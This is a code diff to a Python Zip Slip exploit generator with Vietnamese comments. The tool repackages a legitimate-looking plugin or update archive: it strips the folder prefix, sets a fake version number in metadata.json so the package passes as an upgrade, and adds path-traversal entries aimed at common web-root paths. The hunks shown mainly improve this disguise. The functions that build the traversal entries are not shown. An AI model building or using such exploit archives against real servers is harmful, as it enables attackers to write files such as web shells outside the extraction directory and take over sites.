@@ -9,6 +9,7 @@ Usage:
 
 import zipfile
 import argparse
+import json
 import os
 import itertools
 import warnings
@@ -50,9 +51,25 @@ def collect_source_files_from_dir(source_dir: str) -> list[tuple[str, bytes]]:
 def collect_source_files_from_zip(zip_path: str) -> list[tuple[str, bytes]]:
     result = []
     with zipfile.ZipFile(zip_path, "r") as src:
+        all_names = [i.filename for i in src.infolist() if not i.is_dir()]
+
+        # Phát hiện top-level prefix (vd: "KIAN 2.0.3/") để strip ra
+        # → đảm bảo metadata.json nằm ở root trong ZIP output
+        prefix = ""
+        roots = {n.split("/")[0] for n in all_names if "/" in n}
+        flat  = [n for n in all_names if "/" not in n]
+        if not flat and len(roots) == 1:
+            prefix = roots.pop() + "/"
+            print(f"[*] Detected zip prefix: '{prefix}' — sẽ strip khi copy")
+
         for item in src.infolist():
-            if not item.is_dir():
-                result.append((item.filename, src.read(item.filename)))
+            if item.is_dir():
+                continue
+            arc_name = item.filename
+            if prefix and arc_name.startswith(prefix):
+                arc_name = arc_name[len(prefix):]
+            if arc_name:
+                result.append((arc_name, src.read(item.filename)))
     return result
 
 
@@ -79,7 +96,7 @@ def build_traversal_entries(webroots: list[str]) -> list[tuple[str, bytes]]:
     return entries
 
 
-def generate(source: str, output: str, webroots: list[str]):
+def generate(source: str, output: str, webroots: list[str], args_version: str = ""):
     source_files = collect_source_files(source)
     traversal_entries = build_traversal_entries(webroots)
 
@@ -89,8 +106,13 @@ def generate(source: str, output: str, webroots: list[str]):
 
     with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
 
-        # 1. Copy toàn bộ file gốc
+        # 1. Copy toàn bộ file gốc, override metadata.json nếu cần
         for arc_name, data in source_files:
+            if arc_name == "metadata.json" and args_version:
+                meta = json.loads(data.decode())
+                meta["version"] = args_version
+                data = json.dumps(meta, ensure_ascii=False).encode()
+                print(f"[*] metadata.json version → {args_version}")
             zf.writestr(zipfile.ZipInfo(arc_name), data)
 
         # 2. Thêm entry path traversal
@@ -145,6 +167,8 @@ def main():
                         help="Tên file ZIP đầu ra (default: zipslip_full.zip)")
     parser.add_argument("--webroot", default=None,
                         help="Chỉ định 1 web root cụ thể (mặc định thử nhiều path)")
+    parser.add_argument("--version", default="2.0.5",
+                        help="Version ghi vào metadata.json (default: 2.0.5)")
     args = parser.parse_args()
 
     is_dir  = os.path.isdir(args.source)
@@ -156,7 +180,7 @@ def main():
 
     print(f"[*] Mode: {'directory' if is_dir else 'zip file'}")
     webroots = [args.webroot] if args.webroot else DEFAULT_WEBROOTS
-    generate(args.source, args.output, webroots)
+    generate(args.source, args.output, webroots, args_version=args.version)
 
 
 if __name__ == "__main__":
